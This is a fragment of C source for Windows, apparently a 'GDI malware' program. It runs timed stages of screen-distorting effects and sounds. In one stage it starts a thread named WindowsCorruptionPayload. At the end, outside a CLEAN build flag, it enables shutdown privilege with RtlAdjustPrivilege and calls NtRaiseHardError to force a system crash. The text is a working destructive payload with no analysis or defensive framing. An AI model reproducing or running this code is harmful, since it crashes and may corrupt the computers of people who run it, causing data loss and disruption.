		HANDLE thread4 = CreateThread(0, 0, blur1, 0, 0, 0);
		sound4();
		Sleep(30000);
		TerminateThread(thread4, 0);
		CloseHandle(thread4);
		InvalidateRect(0, 0, 0);
		HANDLE thread5 = CreateThread(0, 0, blur2, 0, 0, 0);
		sound5();
		Sleep(30000);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		TerminateThread(thread3dot1, 0);
		CloseHandle(thread3dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread6 = CreateThread(0, 0, shader3, 0, 0, 0);
		sound6();
		Sleep(30000);
		TerminateThread(thread6, 0);
		CloseHandle(thread6);
		InvalidateRect(0, 0, 0);
		HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
		sound7();
		Sleep(30000);
		TerminateThread(thread7, 0);
		CloseHandle(thread7);
		InvalidateRect(0, 0, 0);
		HANDLE thread8 = CreateThread(0, 0, sines, 0, 0, 0);
		HANDLE thread8dot1 = CreateThread(0, 0, WindowsCorruptionPayload, 0, 0, 0);
		sound8();
		Sleep(30000);
		TerminateThread(thread8, 0);
		CloseHandle(thread8);
		TerminateThread(thread8dot1, 0);
		CloseHandle(thread8dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread9 = CreateThread(0, 0, shader5, 0, 0, 0);
		Sleep(5000);
#ifndef CLEAN
		BOOLEAN bl;
		DWORD response;
		NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
		RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
		RtlAdjustPrivilege(19, 1, 0, &bl);
		NtRaiseHardError(0xC0000229, 0, 0, 0, 6, &response);
		Sleep(-1);
#endif
	}
}